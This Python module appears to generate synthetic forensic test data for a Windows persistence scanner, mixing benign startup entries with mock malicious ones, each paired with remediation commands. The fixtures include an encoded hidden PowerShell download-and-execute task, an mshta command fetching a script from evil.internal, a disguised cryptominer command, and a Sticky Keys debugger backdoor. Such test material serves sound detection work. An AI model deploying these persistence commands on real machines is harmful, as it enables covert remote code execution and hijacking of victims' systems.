"""
Forensic Simulation Scenario Generator.
Provides realistic APT campaign datasets and suspicious artifact mockups for training and testing.
"""

from typing import List
from core.models import (
    StartupEntry, ASEPCategory, ThreatSeverity, DigitalSignatureInfo,
    PEFileInfo, HeuristicFinding
)


class ScenarioGenerator:
    """Generates synthetic high-fidelity forensic test cases mimicking real-world APTs."""

    @classmethod
    def get_simulated_dataset(cls) -> List[StartupEntry]:
        """Returns a curated dataset containing realistic benign software and active malware persistence."""
        entries: List[StartupEntry] = []

        # 1. APT Threat: Encoded PowerShell Scheduled Task (Cobalt Strike / APT29)
        apt_task = StartupEntry(
            name="Task: WindowsDefenderTelemetryUpdate",
            category=ASEPCategory.SCHEDULED_TASK,
            location=r"Tasks\Microsoft\Windows\Maintenance\TelemetryUpdate",
            raw_command="powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwB5AHMAdABlAG0ALQB1AHAAZABhAHQAZQBzAC4AdABvAHAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
            resolved_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            arguments="-w hidden -enc SQBFAFgAIAAo...",
            enabled=True,
            user_context="NT AUTHORITY\\SYSTEM (At System Startup)",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="Microsoft Windows",
                issuer_name="Microsoft Root Certificate Authority 2010",
                is_trusted_publisher=True
            ),
            remediation_command='Unregister-ScheduledTask -TaskName "\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate" -Confirm:$false'
        )
        entries.append(apt_task)

        # 2. Critical Threat: System Process Masquerading in Public Folder (XMRig / Trojan)
        masq_miner = StartupEntry(
            name="WinAudioHelper",
            category=ASEPCategory.REGISTRY_RUN,
            location=r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            raw_command=r'"C:\Users\Public\svchost.exe" --background --stratum=pool.minexmr.com:4444',
            resolved_path=r"C:\Users\Public\svchost.exe",
            arguments="--background --stratum=pool.minexmr.com:4444",
            enabled=True,
            user_context="HKCU",
            signature=DigitalSignatureInfo(
                is_signed=False,
                status="NotSigned",
                signer_name="",
                issuer_name="",
                is_trusted_publisher=False
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Users\Public\svchost.exe",
                exists=True,
                file_size=1428480,
                md5="e4d909c290d0fb1ca068ffaddf22cbd0",
                sha1="3b71f43ff30f4b15b5cd85d600d810913f3cb863",
                sha256="8f4e2b01c34a9b58210f92b7405df6248d21b926487e42d743a196e481283c9a",
                entropy=7.86,
                is_high_entropy=True,
                compile_time="2026-08-12 04:12:00 UTC",
                subsystem="Windows Console",
                imphash="a1b2c3d4e5f60718293a4b5c6d7e8f90",
                company_name="Microsoft Corporation",  # Impersonation!
                anomalies=[
                    "Known packer/crypter section identified: '.upx0'",
                    "Section '.upx1' exhibits extremely high entropy (7.92)",
                    "Suspicious API imports detected: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"
                ]
            ),
            remediation_command='Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WinAudioHelper"'
        )
        entries.append(masq_miner)

        # 3. Critical Threat: Sticky Keys IFEO Debugger Hijack
        ifeo_backdoor = StartupEntry(
            name="IFEO Hijack: sethc.exe",
            category=ASEPCategory.REGISTRY_IFEO,
            location=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
            raw_command=r"C:\Windows\System32\cmd.exe",
            resolved_path=r"C:\Windows\System32\cmd.exe",
            arguments="",
            enabled=True,
            user_context="HKLM (System-wide)",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="Microsoft Windows",
                issuer_name="Microsoft Root Certificate Authority 2010",
                is_trusted_publisher=True
            ),
            remediation_command='Remove-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" -Name "Debugger"'
        )
        entries.append(ifeo_backdoor)

        # 4. High Threat: WMI Event Consumer Backdoor (MSHTA LOLBin)
        wmi_backdoor = StartupEntry(
            name="WMI Subscription: SystemHealthSync",
            category=ASEPCategory.WMI_SUBSCRIPTION,
            location=r"root\subscription\CommandLineEventConsumer (SystemHealthSync)",
            raw_command=r"mshta.exe javascript:a=new(ActiveXObject)('WScript.Shell');a.Run('powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\'http://evil.internal/sync.hta\')',0);window.close()",
            resolved_path=r"C:\Windows\System32\mshta.exe",
            arguments="javascript:a=new...",
            enabled=True,
            user_context="NT AUTHORITY\\SYSTEM (WMI Provider)",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="Microsoft Windows",
                issuer_name="Microsoft Root Certificate Authority 2010",
                is_trusted_publisher=True
            ),
            remediation_command='Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name=\'SystemHealthSync\'" | Remove-CimInstance'
        )
        entries.append(wmi_backdoor)

        # 5. Medium Vulnerability: Unquoted Service Path (Privilege Escalation Vector)
        unquoted_svc = StartupEntry(
            name="Service: Custom Cloud Enterprise Agent",
            category=ASEPCategory.WINDOWS_SERVICE,
            location=r"HKLM\SYSTEM\CurrentControlSet\Services\CloudAgent",
            raw_command=r"C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe --start",
            resolved_path=r"C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe",
            arguments="--start",
            enabled=True,
            user_context="LocalSystem (Auto Start)",
            signature=DigitalSignatureInfo(
                is_signed=False,
                status="NotSigned",
                signer_name="",
                issuer_name="",
                is_trusted_publisher=False
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Program Files\Enterprise Cloud Agent\service\agent_service.exe",
                exists=True,
                file_size=512000,
                entropy=6.12,
                is_high_entropy=False,
                compile_time="2025-11-04 10:15:00 UTC",
                subsystem="Windows Console"
            ),
            remediation_command='Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\CloudAgent" -Name "ImagePath" -Value \'"C:\\Program Files\\Enterprise Cloud Agent\\service\\agent_service.exe" --start\''
        )
        entries.append(unquoted_svc)

        # 6. Critical Threat: Deceptive Double File Extension in Startup Folder
        double_ext = StartupEntry(
            name="Startup File: Q3_Financial_Audit_Report.pdf.exe",
            category=ASEPCategory.STARTUP_FOLDER,
            location=r"User Startup Folder (C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe)",
            raw_command=r"C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe",
            resolved_path=r"C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe",
            arguments="",
            enabled=True,
            user_context="HKCU",
            signature=DigitalSignatureInfo(
                is_signed=False,
                status="NotSigned",
                signer_name="",
                issuer_name="",
                is_trusted_publisher=False
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Users\TargetUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Q3_Financial_Audit_Report.pdf.exe",
                exists=True,
                file_size=834560,
                md5="5d41402abc4b2a76b9719d911017c592",
                sha256="4cf8291a84f38d6f72576315804537b04f56f1008263da10240f471edd2f8605",
                entropy=7.68,
                is_high_entropy=True,
                anomalies=["Timestomping anomaly: Ancient compile timestamp (1970-01-01 00:00:00 UTC)"]
            ),
            remediation_command='Remove-Item -Path "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe" -Force'
        )
        entries.append(double_ext)

        # 7. Benign Baseline: Google Chrome Startup Update (Signed & Clean)
        chrome_startup = StartupEntry(
            name="GoogleChromeAutoLaunch",
            category=ASEPCategory.REGISTRY_RUN,
            location=r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            raw_command=r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window /prefetch:5',
            resolved_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            arguments="--no-startup-window /prefetch:5",
            enabled=True,
            user_context="HKCU",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US",
                issuer_name="DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1",
                is_trusted_publisher=True
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                exists=True,
                file_size=3245056,
                entropy=6.45,
                is_high_entropy=False,
                company_name="Google LLC",
                product_name="Google Chrome"
            ),
            remediation_command='Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "GoogleChromeAutoLaunch"'
        )
        entries.append(chrome_startup)

        # 8. Benign Baseline: Microsoft OneDrive (Signed & Clean)
        onedrive_startup = StartupEntry(
            name="OneDrive",
            category=ASEPCategory.REGISTRY_RUN,
            location=r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            raw_command=r'"C:\Users\TargetUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background',
            resolved_path=r"C:\Users\TargetUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
            arguments="/background",
            enabled=True,
            user_context="HKCU",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
                issuer_name="Microsoft Corporation Third Party Marketplace Root",
                is_trusted_publisher=True
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Users\TargetUser\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                exists=True,
                file_size=4210688,
                entropy=6.32,
                is_high_entropy=False,
                company_name="Microsoft Corporation",
                product_name="Microsoft OneDrive"
            ),
            remediation_command='Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "OneDrive"'
        )
        entries.append(onedrive_startup)

        # 9. Benign Baseline: Windows Explorer Shell Default
        win_shell = StartupEntry(
            name="Winlogon Shell",
            category=ASEPCategory.REGISTRY_WINLOGON,
            location=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
            raw_command="explorer.exe",
            resolved_path=r"C:\Windows\explorer.exe",
            arguments="",
            enabled=True,
            user_context="HKLM",
            signature=DigitalSignatureInfo(
                is_signed=True,
                status="Valid",
                signer_name="Microsoft Windows",
                issuer_name="Microsoft Root Certificate Authority",
                is_trusted_publisher=True
            ),
            file_info=PEFileInfo(
                file_path=r"C:\Windows\explorer.exe",
                exists=True,
                file_size=5132000,
                entropy=6.28,
                is_high_entropy=False,
                company_name="Microsoft Corporation",
                product_name="Windows Explorer"
            )
        )
        entries.append(win_shell)

        return entries
